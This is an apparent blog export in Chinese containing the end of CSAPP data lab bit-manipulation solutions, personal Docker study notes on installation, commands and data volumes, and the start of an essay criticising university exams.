<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int conditional(int x, int y, int z) &#123;</span><br><span class="line">  x &#x3D; (!!x)&lt;&lt;31&gt;&gt;31;</span><br><span class="line">  return (y&amp;x)|(z&amp;~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求该函数实现三元运算符，若x为真，则返回y,否则返回z。</p>
<p>若<code>x</code>的取值为<code>0x00000000</code>或<code>0xFFFFFFFF</code>。则答案为<code>(x&amp;y)|(~x&amp;z)</code>。</p>
<p>若<code>x！=0</code>时，将<code>x=0xFFFFFFFF</code>。<code>x = (!!x)&lt;&lt;31&gt;&gt;31</code>。</p>
<h5 id="8-int-isnonnegativeint-x"><a class="markdownIt-Anchor" href="#8-int-isnonnegativeint-x"></a> 8. <code>int isNonNegative(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isNonNegative(int x) &#123;</span><br><span class="line">    return !(x&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>判断最高位。</p>
<h5 id="9int-isgreaterint-x-int-y"><a class="markdownIt-Anchor" href="#9int-isgreaterint-x-int-y"></a> 9.<code>int isGreater(int x, int y)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isGreater(int x, int y) &#123;</span><br><span class="line">    int sign_x&#x3D;x&gt;&gt;31;</span><br><span class="line">    int sign_y&#x3D;y&gt;&gt;31;</span><br><span class="line">    int equal&#x3D;!(sign_x^sign_y)&amp;((~y+x)&gt;&gt;31);</span><br><span class="line">    int notequal&#x3D;sign_x&amp;!sign_y;</span><br><span class="line">    return !(equal|notequal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果x&gt;y返回1否则返回0。</p>
<p>以下情况会返回<code>1</code>：</p>
<p>当<code>x&gt;0,y&lt;0</code>，或者当<code>x</code>和<code>y</code>符号相同时<code>mark_ = ~((x^y)&gt;&gt;31)</code>，满足<code>x+~y+1&gt;0</code>，<code>x!=y</code>时，<code>equl_ = !!(x^y)=1</code>，<code>x+~y+1&gt;=0</code>时，<code>(~(x+~y+1))&gt;&gt;31 = 0xffffffff</code></p>
<h5 id="10int-absvalint-x"><a class="markdownIt-Anchor" href="#10int-absvalint-x"></a> 10.<code>int absVal(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int absVal(int x) &#123;</span><br><span class="line">  int sign&#x3D;x&gt;&gt;31;</span><br><span class="line">  return (x^sign)+(sign&amp;1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>返回x的绝对值。</p>
<p>首先判断x的符号位，即右移31位。</p>
<p>倘若为正数，则返回值不变；则先用x与sign异或再加上sign与1与运算。</p>
<p>倘若为负数则异或后（即按位取反减1）后要再加上。</p>
<h5 id="11-int-ispower2int-x"><a class="markdownIt-Anchor" href="#11-int-ispower2int-x"></a> 11. <code>int isPower2(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isPower2(int x) &#123;</span><br><span class="line">    int sign1&#x3D;!(x&gt;&gt;31);</span><br><span class="line">    int sign2&#x3D;!!x;</span><br><span class="line">    int sign3&#x3D;!(x&amp;(x+~0));</span><br><span class="line">    return (sign1&amp;sign2&amp;sign3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果参数x是2的权重返回1，否则返回0（负数都返回0）。</p>
<p>首先<code>sign1</code>判断x是正数还是负数，<code>sign2</code>判断x是否为0。若x为2的倍数，则x的位中则只有一位为1，因此当x为2的倍数时x和（x-1）按位与的结果必然为0，否则为1，因此将<code>!(x&amp;(x+~0))</code>作为<code>sign3</code>最后取与运算则得到结果。</p>
<h5 id="12unsigned-float_negunsigned-uf"><a class="markdownIt-Anchor" href="#12unsigned-float_negunsigned-uf"></a> 12.<code>unsigned float_neg(unsigned uf)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_neg(unsigned uf) &#123;</span><br><span class="line">    if((uf&amp;0x7fffffff)&gt;0x7f800000)return uf;</span><br><span class="line">    return uf^0x80000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>直接使用<code>&gt;</code>判断即可，但需要注意<code>+0/-0</code>还有<code>NaN</code>这两种特殊情况。</p>
<p>判断<code>NaN</code>时，指数段为<code>0xff</code>，小数段不全为<code>0</code>，<code>(uf&amp;0x7fffffff) &gt; 0x7f800000</code>。</p>
<h5 id="13unsigned-float_i2fint-x"><a class="markdownIt-Anchor" href="#13unsigned-float_i2fint-x"></a> 13.<code>unsigned float_i2f(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_i2f(int x) &#123;</span><br><span class="line">  int s_ &#x3D; x&amp;0x80000000;</span><br><span class="line">  int n_ &#x3D; 30;</span><br><span class="line">  if(!x) return 0;</span><br><span class="line">  if(x&#x3D;&#x3D;0x80000000) return 0xcf000000;</span><br><span class="line">  if(s_) x &#x3D; ~x+1;</span><br><span class="line">  while(!(x&amp;(1&lt;&lt;n_))) n_--;</span><br><span class="line">  if(n_&lt;&#x3D;23) x&lt;&lt;&#x3D;(23-n_);</span><br><span class="line">  else&#123;</span><br><span class="line">    x+&#x3D;(1&lt;&lt;(n_-24));</span><br><span class="line">    if(x&lt;&lt;(55-n_)) ;else x&amp;&#x3D;(0xffffffff&lt;&lt;(n_-22));</span><br><span class="line">    if(x&amp;(1&lt;&lt;n_))  ;else n_++;</span><br><span class="line">    x &gt;&gt;&#x3D; (n_-23);</span><br><span class="line">  &#125;</span><br><span class="line">  x&#x3D;x&amp;0x007fffff;</span><br><span class="line">  n_&#x3D;(n_+127)&lt;&lt;23;</span><br><span class="line">  return x|n_|s_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>分三部分处理，获取符号位<code>s_ = x&amp;0x80000000</code>，若为负数<code>-x</code>，变为正数，则<code>0x80000000</code>为特殊情况分开处理，考虑特殊情况，<code>0x0</code>和<code>0x80000000</code>，这两种情况直接返回<code>0</code>和<code>0xcf000000</code>。</p>
<p>获取最高位的<code>1</code>所在位置，<code>while(!(x&amp;(1&lt;&lt;n_))) n_--;</code>。</p>
<p>若<code>n_ &lt;= 23</code>这个数需要向左移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），<code>if(n_&lt;=23) x&lt;&lt;=(23-n_);</code>。</p>
<p>若<code>n_ &gt; 23</code>这个数需要向右移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），这时候需要考虑移出部分的舍入问题，若移出部分大于<code>0.5</code>则向上舍入，若小于<code>0.5</code>则向下舍去，若等于<code>0.5</code>则向偶数舍入。</p>
<p>先将<code>&gt;=0.5</code>情况等同考虑，向上舍入<code>x+=(1&lt;&lt;(n_-24))</code>。若<code>==0.5</code>时，舍入情况若为奇数，我们需要<code>-1</code>操作变为偶数，即将最低位的<code>1</code>变为<code>0</code>，<code>x&amp;=(0xffffffff&lt;&lt;(n_-22))</code>，若向上舍入时最高位产生了进位，还需要加上进位<code>if(x&amp;(1&lt;&lt;n_)) ;else n_++;</code>。之后拼接浮点数即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2020/06/27/Docker/</url>
    <content><![CDATA[<p><img src="/2020/06/27/Docker/docker.png" alt></p>
<a id="more"></a>
<h2 id="docker是什么"><a class="markdownIt-Anchor" href="#docker是什么"></a> Docker是什么</h2>
<p>将程序、开发环境、配置打包放到一个容器中，不需要在部署时进行环境的配置。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</p>
<p>Docker是基于Go语言实现的云开源项目。</p>
<p>Docker的主要目标是“Build，Ship and Run Any App，Anywhere”，也就是对应用组件进行封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。</p>
<p><strong>Docker包含两方面技术：</strong></p>
<p>镜像技术：“镜像即应用”，（运行文档、配置环境、运行环境、运行依赖包、操作系统发行版、内核）</p>
<h2 id="docker能做什么"><a class="markdownIt-Anchor" href="#docker能做什么"></a> Docker能做什么</h2>
<h3 id="之前的虚拟机技术"><a class="markdownIt-Anchor" href="#之前的虚拟机技术"></a> 之前的虚拟机技术：</h3>
<p>虚拟机就是带环境安装的一种解决方案。</p>
<p>它可以在一种操作系统里面运行另一种操作系统，比如在Windows系统里面运行Linux系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响，这类虚拟机完美地运行了另一套系统，能够使应用程序，操作系统和硬件三者之间逻辑不变。</p>
<h3 id="容器虚拟化技术"><a class="markdownIt-Anchor" href="#容器虚拟化技术"></a> 容器虚拟化技术</h3>
<p>Linux发展出了另一种虚拟化技术：Linux容器（Linux Containers 简写为LXC）。</p>
<p><strong>Linux容器不是模拟一个完整的操作系统</strong>，而是对进程进行隔离。有了容器，就可以将软件运行时所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要将软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境下的软件都能始终如一地运行。</p>
<h3 id="开发运维devops"><a class="markdownIt-Anchor" href="#开发运维devops"></a> 开发/运维（DevOps）</h3>
<p>开发者自己运维</p>
<p><strong>一次构建、随处运行</strong></p>
<h2 id="docker的安装"><a class="markdownIt-Anchor" href="#docker的安装"></a> Docker的安装</h2>
<h3 id="centos-docker安装"><a class="markdownIt-Anchor" href="#centos-docker安装"></a> CentOS Docker安装</h3>
<p>Docker支持以下的CentOS版本：</p>
<p>CentOS 7（64bit）</p>
<p>CentOS 6.5 （64bit）或更高版本</p>
<h3 id="前提条件"><a class="markdownIt-Anchor" href="#前提条件"></a> 前提条件</h3>
<p>目前，CentOS仅发行版中的内核支持Docker。</p>
<p>Docker运行在CentOS 7上，要求系统为64位，系统内核版本为3.10以上。</p>
<p>Docker运行在CentOS 6.5或更高版本的CentOS上，要求系统为64位，系统内核版本为2.6.32-431或者更高版本。</p>
<p>使用<code>uname -r</code>查看CentOS版本。</p>
<h3 id="docker的基本组成"><a class="markdownIt-Anchor" href="#docker的基本组成"></a> Docker的基本组成</h3>
<p><strong>镜像（image）<strong>就是一个</strong>只读</strong>的模板，镜像可以用来创建Docker容器，一个镜像可以创建很多容器。</p>
<p>**容器（container）**Docker利用容器独立运行的一个或一组应用。容器是镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是互相隔离的、保证安全的平台。</p>
<p>可以把容器看成是一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>
<p>容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。</p>
<p>**仓库（repository）**是集中存放镜像文件的地方。仓库（repository）和仓库注册服务器（registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库又包含了多个镜像，每个镜像有不同的标签（tag）。</p>
<h2 id="centos-7安装docker"><a class="markdownIt-Anchor" href="#centos-7安装docker"></a> CentOS 7安装Docker</h2>
<p><strong>使用命令查看CentOS的版本：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CentOS Linux release 7.3.1611 (Core) </span><br></pre></td></tr></table></figure>
<p><strong>安装gcc：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc</span><br><span class="line">yum -y install gcc-c++</span><br></pre></td></tr></table></figure>
<p><strong>如果安装过Docker则需要删除软件包：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
<p>如果未安装过Docker，则会有以下提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">No Match for argument: docker</span><br><span class="line">No Match for argument: docker-client</span><br><span class="line">No Match for argument: docker-client-latest</span><br><span class="line">No Match for argument: docker-common</span><br><span class="line">No Match for argument: docker-latest</span><br><span class="line">No Match for argument: docker-latest-logrotate</span><br><span class="line">No Match for argument: docker-logrotate</span><br><span class="line">No Match for argument: docker-engine</span><br><span class="line">No Packages marked for removal</span><br></pre></td></tr></table></figure>
<p><strong>安装Docker CE：</strong></p>
<p><strong>通过添加仓库安装：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>国外服务器太慢可以切换到阿里云的源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \ </span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/dockerce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>查看源文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/yum.repos.d/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>更新yum软件包索引：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
<p>安装Docker CE：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install docker-ce</span><br></pre></td></tr></table></figure>
<p>查看Docker版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<p>启动Docker：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p>首次运行hello world：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unable to find image &#39;hello-world:latest&#39; locally</span><br><span class="line">latest: Pulling from library&#x2F;hello-world</span><br><span class="line">0e03bdcc26d7: Pull complete </span><br><span class="line">Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https:&#x2F;&#x2F;hub.docker.com&#x2F;</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              bf756fb1ae65        5 months ago        13.3kB</span><br></pre></td></tr></table></figure>
<p><strong>配置镜像加速：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">(配置网易云或者阿里云镜像加速)</span><br><span class="line"><span class="meta">#</span><span class="bash">网易</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;:[&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云</span></span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;:[&quot;https://&#123;自己的编码&#125;.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="docker运行底层原理"><a class="markdownIt-Anchor" href="#docker运行底层原理"></a> Docker运行底层原理</h2>
<p>（1）docker有着比虚拟机更少的抽象层，由于docker不需要Hypervisor实现硬件资源虚拟化，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</p>
<p>（2）docker利用的是宿主机的内核，而不需要Guest OS。因此，当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。仍可避免引寻、加载操作系统内核返个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统，则省略了返个过程，因此新建一个docker容器只需要几秒钟。</p>
<h2 id="docker常用命令"><a class="markdownIt-Anchor" href="#docker常用命令"></a> Docker常用命令</h2>
<h3 id="docker帮助命令"><a class="markdownIt-Anchor" href="#docker帮助命令"></a> Docker帮助命令</h3>
<p><strong>docker version</strong></p>
<p><strong>docker info</strong></p>
<p><strong>docker --help</strong></p>
<h3 id="docker镜像命令"><a class="markdownIt-Anchor" href="#docker镜像命令"></a> Docker镜像命令</h3>
<p><strong>docker images</strong></p>
<p>列出本地主机上的镜像。</p>
<p>选项说明：</p>
<p>-a：列出本地所有的镜像（含中间映像层）</p>
<p>-q：只显示镜像ID。</p>
<p>–digests：显示镜像的摘要信息。</p>
<p>–no-trunc：显示完整的镜像信息。</p>
<p><strong>docker search [OPTIONS] 镜像名字</strong></p>
<p>选项说明：</p>
<p>–no-trunc：显示完整的镜像描述</p>
<p>-s：列出收藏数不小于指定值的镜像。</p>
<p>–automated：只列出automated build类型的镜像</p>
<p><strong>docker pull [OPTIONS] 镜像名字 [:TAG]</strong></p>
<p><strong>docker rmi 删除某个镜像</strong></p>
<h3 id="docker容器命令"><a class="markdownIt-Anchor" href="#docker容器命令"></a> Docker容器命令</h3>
<p>**新建并启动一个容器：**docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it centos</span><br></pre></td></tr></table></figure>
<p><strong>列出当前所有正在运行的容器</strong></p>
<p>docker ps [OPTIONS]</p>
<p>OPTIONS说明（常用）</p>
<p>-a：列出当前所有正在运行的容器+历史运行过的</p>
<p>-l：显示最近创建的容器</p>
<p>-n：显示最近n个创建的容器</p>
<p>-q：静默模式，只显示容器编号</p>
<p>–not-trunc：不截断输出</p>
<p><strong>退出容器</strong></p>
<p>exit：容器停止退出</p>
<p>ctrl+P+Q：容器不停止退出</p>
<p><strong>启动容器</strong></p>
<p>docker start 容器ID或者容器名</p>
<p><strong>重启容器</strong></p>
<p>docker restart 容器ID或者容器名</p>
<p><strong>停止容器</strong></p>
<p>docker stop 容器ID或者容器名</p>
<p><strong>强制停止容器</strong></p>
<p>docker kill 容器ID或者容器名</p>
<p><strong>删除容器</strong></p>
<p>docker rm 容器ID或者容器名</p>
<p><strong>一次性删除多个容器</strong></p>
<p>docker rm -f $(docker ps -a -q)</p>
<p>docker ps -a -1 | xargs docker rm</p>
<h3 id="重要命令"><a class="markdownIt-Anchor" href="#重要命令"></a> 重要命令</h3>
<p><strong>启动守护式容器：</strong></p>
<p>docker run -d</p>
<p><strong>查看容器日志：</strong></p>
<p>docker logs -f -t --tail 容器ID</p>
<p><strong>显示docker内部进程</strong></p>
<p>docker top 容器ID</p>
<p><strong>查看容器内部细节</strong></p>
<p>docker inspect 容器ID</p>
<p><strong>进入正在运行的容器并以命令行交互</strong></p>
<p>docker exex -it 容器ID bashShell</p>
<p>重新进入docker attach 容器ID</p>
<p><strong>上述两者区别：</strong></p>
<p>attach直接进入容器启动命令的终端，不会启动新的进程</p>
<p>exec是在容器中打开新的终端，并且可以启动新的进程</p>
<p><strong>从容器内拷贝文件到主机上</strong></p>
<p>docker cp 容器ID：容器内路径 目的主机路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp id: /tmp/log /root</span><br></pre></td></tr></table></figure>
<h2 id="docker镜像"><a class="markdownIt-Anchor" href="#docker镜像"></a> Docker镜像</h2>
<p>镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
<h3 id="unionfs联合文件系统"><a class="markdownIt-Anchor" href="#unionfs联合文件系统"></a> UnionFS（联合文件系统）</h3>
<p>联合文件系统（Union File System）：2004年由纽约州立大学石溪分校开发，它可以把多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的。UnionFS允许只读和可读写目录并存，就是说可同时删除和增加内容。UnionFS应用的地方很多，比如在多个磁盘分区上合并不同文件系统的主目录，或把几张CD光盘合并成一个统一的光盘目录(归档)。另外，具有写时复制(copy-on-write)功能UnionFS可以把只读和可读写文件系统合并在一起，虚拟上允许只读文件系统的修改可以保存到可写文件系统当中。</p>
<p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p>
<h3 id="镜像加载原理"><a class="markdownIt-Anchor" href="#镜像加载原理"></a> 镜像加载原理</h3>
<p>rootfs和bootfs</p>
<p>任何程序运行时都会有依赖，无论是开发语言层的依赖库，还是各种系统lib、操作系统等，不同的系统上这些库可能是不一样的，或者有缺失的。为了让容器运行时一致，docker将依赖的操作系统、各种lib依赖整合打包在一起（即镜像），然后容器启动时，作为它的根目录（根文件系统rootfs），使得容器进程的各种依赖调用都在这个根目录里，这样就做到了环境的一致性。</p>
<p>不过，这时你可能已经发现了另一个问题：<strong>难道每开发一个应用，都要重复制作一次rootfs吗（那每次pull/push一个系统岂不疯掉）？</strong></p>
<p>比如，我现在用Debian操作系统的ISO做了一个rootfs，然后又在里面安装了Golang环境，用来部署我的应用A。那么，我的另一个同事在发布他的Golang应用B时，希望能够直接使用我安装过Golang环境的rootfs，而不是重复这个流程，那么本文的主角UnionFS就派上用场了。</p>
<p><strong>Docker镜像的设计中，引入了层（layer）的概念</strong>，也就是说，用户制作镜像的每一步操作，都会生成一个层，也就是一个增量rootfs（一个目录），这样应用A和应用B所在的容器共同引用相同的Debian操作系统层、Golang环境层（作为只读层），而各自有各自应用程序层，和可写层。启动容器的时候通过UnionFS把相关的层挂载到一个目录，作为容器的根文件系统。</p>
<p>需要注意的是，rootfs只是一个操作系统所包含的文件、配置和目录，并不包括操作系统内核。这就意味着，如果你的应用程序需要配置内核参数、加载额外的内核模块，以及跟内核进行直接的交互，你就需要注意了：<strong>这些操作和依赖的对象，都是宿主机操作系统的内核，它对于该机器上的所有容器来说是一个“全局变量”，牵一发而动全身。</strong></p>
<h3 id="docker镜像commit操作"><a class="markdownIt-Anchor" href="#docker镜像commit操作"></a> Docker镜像commit操作</h3>
<p>docker commit 提交容器副本使之成为新的镜像</p>
<p>docker commit -m=“提交的描述信息” -a=“作者” 容器ID 要创建的目标镜像名：[标签名]</p>
<p>docker run -it p 8080:8080 tomcat</p>
<h2 id="容器数据卷"><a class="markdownIt-Anchor" href="#容器数据卷"></a> 容器数据卷</h2>
<p>容器的持久化、容器间继承和共享数据。</p>
<h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3>
<p>1.数据卷可在容器之间共享或重用数据</p>
<p>2.卷中的更改可以直接生效</p>
<p>3.数据卷中的更改不会包含在镜像的更新中</p>
<p>4.数据卷的生命周期一直持续到没有容器使用它为止</p>
<h3 id="容器内添加数据卷"><a class="markdownIt-Anchor" href="#容器内添加数据卷"></a> 容器内添加数据卷</h3>
<h4 id="直接命令添加"><a class="markdownIt-Anchor" href="#直接命令添加"></a> 直接命令添加</h4>
<p>docker run -it -v /宿主机绝对路径目录:/容器内目录 镜像名</p>
<p>命令（带权限）:docker run -it -v /宿主机绝对路径目录:/容器内目录:ro 镜像名  (read only)</p>
<h4 id="容器是否挂载成功"><a class="markdownIt-Anchor" href="#容器是否挂载成功"></a> 容器是否挂载成功</h4>
<p>docker inspect 容器ID 获取JSON格式的配置</p>
<p>Volumes字段</p>
<h3 id="dockerfile添加"><a class="markdownIt-Anchor" href="#dockerfile添加"></a> Dockerfile添加</h3>
<p>**Dockerfile:**描述镜像的文件</p>
<p>VOLUME:[&quot;/dataVoumeContainer&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer3&quot;]</p>
<p><strong>说明：</strong></p>
<p>出于可移植和分享的考虑，用-v 主机目录：容器目录这种方法不能够直接在Dockerfile里实现。</p>
<p>由于宿主机目录是依赖于特定宿主机的，并不能够保证在所有的宿主机上都存在这样的特定目录。</p>
<p><strong>步骤：</strong></p>
<p><strong>根目录下新建mydocker文件夹并进入</strong></p>
<p><strong>可在Dockerfile中使用VOLUME指令来给镜像添加一个或多个数据卷</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;dataVolumeContainer1&quot;</span>,<span class="string">&quot;/dataVolumeContainer2&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;fininsher,-------success1&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -it -v /host1:/dataVolumeContainer1 -v /host2:/dataVolumeContainer2 centos /bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>File构建</strong></p>
<p><strong>build后生成镜像 —获得一个新镜像</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f &#x2F;mydocker&#x2F;dockerfile2 -t zzyy&#x2F;centos.</span><br></pre></td></tr></table></figure>
<p><strong>run容器</strong></p>
<p>通过上述步骤，容器内的卷目录地址已经知道对应的主机目录地址</p>
<p>Docker images ====&gt; DockerFile</p>
<h2 id="数据卷容器"><a class="markdownIt-Anchor" href="#数据卷容器"></a> 数据卷容器</h2>
<p>命名的容器挂载数据卷，其它容器通过挂载这个（父容器）实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p>
<p>以上一步新建的镜像zzyy/centos为模板并运行容器dc01/dc02/dc03</p>
<p>它们已经有容器卷<code>/dataVolumeContainer1 /dataVolumeContainer2</code></p>
<p>容器间传递共享（–volumes-from）</p>
<p>先启动一个父容器dc01  在dataVolumeContainer2新增内容</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Docker</tag>
        <tag>后端开发</tag>
      </tags>
  </entry>
  <entry>
    <title>我为什么讨厌考试</title>
    <url>/2020/12/22/Hate-exam/</url>
    <content><![CDATA[<p>为什么我讨厌考试？这似乎是一句吃不到葡萄说葡萄酸的话，说这句话的人，大多数会被认为是懒惰的，因为他们对待学习不努力以及不思进取所以才会抱怨考试无聊，表示自己其实有学习的能力，只不过不愿意学罢了。在我上大学之前，我也是这么认为的。作为一名中流985大学的学生，我甚至可以说我是考试的受益者，毕竟我也是通过高考选拔上来的。</p>
<p>然而，上了大学，我发现一切都变了，大部分的考试变得无趣又无意义，甚至许多课程本身就毫无意义可言，一门毫无意义的课程，却占着很高的学分，毕业和保研的命脉掌握在它们的手中，你不去学就意味着你就冒着挂科的风险，一旦有一门挂科，就意味着大部分的评奖评优和保研完全没戏了。</p>
<p>虽然一直对大学的课程不太满意，但真正使我决定写下这篇文章的是在我复习《算法设计与分析》这门课的时候。作为一门实践性很强的科目，上课的时候居然连一些实践的作业都没有，唯一的实践机会是在小组组队实现算法的时候。而在我复习的时候在做往年试卷的时候，其中有一道题是，用两种状态空间树的方法来表示回溯法和分支限界法的解空间，我当时是极其愤怒的，这种题目，不就像是孔乙己在问别人，茴字的写法有几种吗？像这种无聊又无用的题目在不同科目的不同试卷中比比皆是。</p>
